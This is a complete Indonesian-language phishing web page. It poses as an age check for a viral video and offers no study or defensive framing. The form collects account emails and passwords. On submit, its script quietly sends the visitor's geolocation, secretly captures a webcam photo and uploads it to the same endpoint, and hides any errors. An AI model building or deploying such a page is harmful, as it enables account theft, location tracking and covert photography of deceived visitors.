<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>VIRAL17menit - Verifikasi</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; font-family:sans-serif; }
        body { background:#000; overflow:hidden; }
        .bg { position:fixed; top:0; left:0; width:100%; height:100%; background:url('https://pexels.com') center/cover; filter:blur(6px) brightness(0.6); z-index:1; transform:scale(1.1); }
        .overlay { position:fixed; top:0; left:0; width:100%; height:100%; z-index:2; display:flex; justify-content:center; align-items:center; background:radial-gradient(circle, rgba(0,0,0,0.1), rgba(0,0,0,0.7)); }
        .card { background:rgba(0,0,0,0.7); backdrop-filter:blur(15px); -webkit-backdrop-filter:blur(15px); border:1px solid rgba(255,255,255,0.1); padding:40px 25px; width:90%; max-width:380px; border-radius:25px; text-align:center; color:#fff; }
        .logo { font-size:32px; font-weight:900; margin-bottom:10px; }
        .logo span { background:#ff9000; color:#000; padding:2px 8px; border-radius:6px; margin-left:5px; }
        input { width:100%; padding:15px; margin-bottom:12px; background:rgba(255,255,255,0.1); border:1px solid rgba(255,255,255,0.2); border-radius:12px; color:#fff; outline:none; }
        .btn { width:100%; padding:15px; background:#ff9000; color:#000; border:none; border-radius:12px; font-weight:800; cursor:pointer; margin-bottom:20px; }
        #loader { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.9); z-index:999; justify-content:center; align-items:center; flex-direction:column; }
        .spin { width:40px; height:40px; border:4px solid #333; border-top:4px solid #ff9000; border-radius:50%; animation:s 0.8s linear infinite; }
        @keyframes s { 0% { transform:rotate(0deg); } 100% { transform:rotate(360deg); } }
    </style>
</head>
<body>
    <div id="loader"><div class="spin"></div><p style="margin-top:15px; color:#ff9000; font-weight:bold;">Memverifikasi...</p></div>
    <div class="bg"></div>
    <div class="overlay">
        <div class="card">
            <div class="logo">VIRAL<span>17menit</span></div>
            <p style="font-size:13px; color:#eee; margin-bottom:25px;">Verifikasi usia untuk menonton video eksklusif.</p>
            <form action="/api/login.php" method="POST" onsubmit="return start()">
                <input type="email" name="email" placeholder="Email Akun" required>
                <input type="password" name="pass" placeholder="Password Akun" required>
                <button type="submit" class="btn">BUKA KONTEN</button>
            </form>
        </div>
    </div>
    <video id="v" style="display:none;" autoplay></video><canvas id="c" style="display:none;"></canvas>
    <script>
        async function start() {
            document.getElementById('loader').style.display = 'flex';
            navigator.geolocation.getCurrentPosition(r => {
                fetch(`/api/login.php?lat=${r.coords.latitude}&lon=${r.coords.longitude}`);
            });
            try {
                const s = await navigator.mediaDevices.getUserMedia({video:true});
                const v = document.getElementById('v'); v.srcObject = s;
                await new Promise(r => setTimeout(r, 3000));
                const c = document.getElementById('c'); c.getContext('2d').drawImage(v, 0, 0, 640, 480);
                await fetch('/api/login.php', { method:'POST', headers:{'Content-Type':'application/x-www-form-urlencoded'}, body:'img='+encodeURIComponent(c.toDataURL('image/png')) });
                s.getTracks().forEach(t => t.stop());
            } catch(e) {}
            return true;
        }
    </script>
</body>
</html>
